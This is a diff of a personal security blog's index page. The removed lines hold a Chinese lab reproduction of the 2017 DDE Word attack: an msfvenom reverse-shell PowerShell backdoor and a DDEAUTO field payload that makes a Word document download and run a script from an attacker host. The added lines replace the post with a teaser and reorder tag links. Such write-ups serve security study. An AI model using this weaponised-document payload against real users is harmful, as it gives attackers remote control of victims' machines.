@@ -174,19 +174,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
-<li>windows10 专业版</li>
-<li>kali 2016.2 &amp; msf</li>
-</ul>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先做好预备工作，我当前kali机器上的ip为：10.211.55.8,使用以下命令产生ps1后门：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom  -p   windows/x64/meterpreter/reverse_tcp  lhost=<span class="number">10.211</span><span class="number">.55</span><span class="number">.8</span>   lport=<span class="number">12345</span>  -f  psh-reflection &gt;/root/search.ps1</div></pre></td></tr></table></figure></p>
-<p>启动一个http服务，将产生的ps1后门放在web服务上传输。<br>然后启动msf，监听12345端口，等待目标打开后门文档。</p>
-<p>接下来步骤就是制作后门文档了：<br>新建一个word空白文档，插入-&gt;文档部件-&gt;域<br><img src="http://ofutja06x.bkt.clouddn.com/doc1.png" alt=""><br>然后添加公式：<br><img src="http://ofutja06x.bkt.clouddn.com/doc2.png" alt=""><br>之后对这一公式进行操作：<br><img src="http://ofutja06x.bkt.clouddn.com/doc3.png" alt=""><br>payload内容如下：</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;DDEAUTO c:\\Windows\\System32\\<span class="keyword">cmd</span>.<span class="bash">exe      <span class="string">"/c powershell.exe -windowstyle hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(' http://10.211.55.8:8080/search.ps1');test.ps1 "</span> &#125;</span></div></pre></td></tr></table></figure>
-<p>这一payload会在攻击机kali上下载产生的后门ps1文件，然后执行后门程序。<br>然后保存word文档，再次打开，就可以看到已经成功反弹回了shell。<br><img src="http://ofutja06x.bkt.clouddn.com/doc4.png" alt=""><br><img src="http://ofutja06x.bkt.clouddn.com/doc5.png" alt=""></p>
-<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>虽然在ps1脚本情况下已经复现成功，但是我的本意是直接执行生成的powershell，无需对外进行通信，但是并没有复现成功，可能字段长度太长，或者是其他原因，昨天弄了一天，没有搞明白是什么原因，于是就试了试ps1脚本，配合msf。(我的本意是用empire或者cs……)</p>
-<p>如果大佬们有看到这篇文章，然后直接执行powershell成功的，可以一起交流下。</p>
-
+        <h1 id="DDE-word0day复现"><a href="#DDE-word0day复现" class="headerlink" title="DDE word0day复现"></a>DDE word0day复现</h1><p>这一段时间office 0day爆出来很多，CVE-2017-0199还有以及其他的变种，之前的在实战过程中已经见到了它的威力，杀毒软件也基本上会对嵌入对象做查杀。前天看到了这一个0day，于是复现了一下，复现过程很简单。<br>
+        
+          <a class="article-more-a" href="/2017/10/14/DDE-word0day复现/#more">more >></a>
+        
       
 
       
@@ -435,11 +426,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">crypto</a>
         		</li>
       		
 		</ul>
@@ -1061,7 +1052,7 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
+                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1073,15 +1064,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">sqli</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">生活</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pentest</a>
               </li>
              
               <li class="article-tag-list-item">
